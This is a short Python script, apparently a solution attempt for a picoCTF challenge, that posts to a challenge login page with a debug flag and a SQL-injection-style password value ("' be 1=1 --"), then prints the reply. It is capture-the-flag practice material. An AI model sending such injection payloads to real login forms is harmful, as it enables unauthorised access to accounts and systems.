import requests

url = "http://jupiter.challenges.picoctf.org:54253/login.php"
data = {"debug": "1", "password": "' be 1=1 --"}

response = requests.post(url, data)
print(response.text)
